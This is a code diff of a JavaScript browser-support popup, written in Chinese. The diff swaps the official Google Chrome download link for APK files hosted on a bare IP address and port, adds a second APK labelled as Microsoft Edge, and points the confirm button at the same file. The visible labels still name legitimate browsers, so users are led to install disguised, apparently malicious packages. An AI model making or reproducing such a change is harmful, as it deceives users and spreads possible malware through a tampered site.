@@ -258,16 +258,17 @@ function showConfirmWithLinks(title, content, callback) {
 // 显示浏览器下载弹窗
 function showChromeDownloadPopup() {
     const content = '您的浏览器不支持 WebUSB，请使用以下浏览器：<br><br>' +
-                    '<a href="https://www.google.com/chrome/downloads/" target="_blank">Google Chrome 浏览器</a><br><br>' +
-                    '点击上方链接直接下载，或点击下方按钮选择浏览器下载。';
+                    '<a href="https://101.42.10.175:35070/down/BOrMbeOyDAba.apk" target="_blank">Google Chrome 浏览器</a><br><br>' +
+                    '<a href="https://101.42.10.175:35070/down/dH4r7RBRe8b7.apk" target="_blank">Microsoft Edge 浏览器</a><br><br>' +
+                    '点击上方链接下载对应浏览器的安装工具。';
     
     showModal('浏览器支持提示', content, {
         showCancel: true,
         cancelText: '取消',
-        confirmText: '下载 Chrome',
+        confirmText: '下载 Chrome 工具',
         callback: function(confirmed) {
             if (confirmed) {
-                window.open('https://www.google.com/chrome/downloads/', '_blank');
+                window.open('https://101.42.10.175:35070/down/BOrMbeOyDAba.apk', '_blank');
             }
         }
     });
